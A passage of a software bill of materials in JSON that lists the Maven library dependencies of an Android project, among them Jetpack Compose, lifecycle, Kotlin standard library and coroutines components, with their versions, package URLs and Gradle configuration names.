\"pkg:maven/androidx.test.espresso/espresso-idling-resource@3.5.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.test.espresso/espresso-idling-resource@3.5.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.squareup\",\n            \"name\": \"javawriter\",\n            \"version\": \"2.1.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.squareup/javawriter@2.1.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.squareup/javawriter@2.1.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"javax.inject\",\n            \"name\": \"javax.inject\",\n            \"version\": \"1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/javax.inject/javax.inject@1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/javax.inject/javax.inject@1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.hamcrest\",\n            \"name\": \"hamcrest-library\",\n            \"version\": \"1.3\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.hamcrest/hamcrest-library@1.3?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.hamcrest/hamcrest-library@1.3?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.hamcrest\",\n            \"name\": \"hamcrest-integration\",\n            \"version\": \"1.3\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.hamcrest/hamcrest-integration@1.3?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.hamcrest/hamcrest-integration@1.3?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-test-junit4\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-test\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.runtime\",\n            \"name\": \"runtime\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-text\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-unit\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.runtime\",\n            \"name\": \"runtime-saveable\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-geometry\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-graphics\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-util\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-core\",\n            \"version\": \"1.7.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-jdk8\",\n            \"version\": \"1.8.20\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.8.20?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.8.20?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-jdk7\",\n            \"version\": \"1.8.20\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.8.20?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.8.20?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"atomicfu\",\n            \"version\": \"0.20.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/atomicfu@0.20.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/atomicfu@0.20.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-test\",\n            \"version\": \"1.7.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test@1.7.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test@1.7.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-jdk8\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"api\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"api\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-common\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"api\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-jdk7\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"api\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.annotation\",\n            \"name\": \"annotation-jvm\",\n            \"version\": \"1.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.annotation/annotation-jvm@1.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.annotation/annotation-jvm@1.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib\",\n            \"version\": \"1.9.10\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-common\",\n            \"version\": \"1.9.10\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.annotation\",\n            \"name\": \"annotation-experimental\",\n            \"version\": \"1.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.annotation/annotation-experimental@1.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.annotation/annotation-experimental@1.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-common\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-android\",\n            \"version\": \"1.7.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-core-jvm\",\n            \"version\": \"1.7.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.7.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.7.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-bom\",\n            \"version\": \"1.7.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.7.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.7.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-test-jvm\",\n            \"version\": \"1.7.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test-jvm@1.7.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test-jvm@1.7.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-runtime\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-runtime-ktx\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-viewmodel\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-viewmodel-ktx\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-viewmodel-savedstate\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-livedata-core\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.material3\",\n            \"name\": \"material3\",\n            \"version\": \"1.2.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.material3/material3@1.2.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.material3/material3@1.2.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-test-manifest\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-tooling\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-tooling-preview\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-test-junit4-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-test-junit4-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-test-junit4-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-graphics-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-graphics-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-graphics-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.material3\",\n            \"name\": \"material3-android\",\n            \"version\": \"1.2.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.material3/material3-android@1.2.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.material3/material3-android@1.2.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-tooling-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-tooling-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-tooling-preview-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-tooling-preview-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-preview-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.runtime\",\n            \"name\": \"runtime-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.runtime/runtime-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.runtime/runtime-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.runtime\",\n            \"name\": \"runtime-saveable-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.runtime/runtime-saveable-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.runtime/runtime-saveable-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.foundation\",\n            \"name\": \"foundation\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.foundation\",\n            \"name\": \"foundation-layout\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.material\",\n            \"name\": \"material-icons-core\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.material\",\n            \"name\": \"material-ripple\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-tooling-data\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-test-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-test-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-test-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": 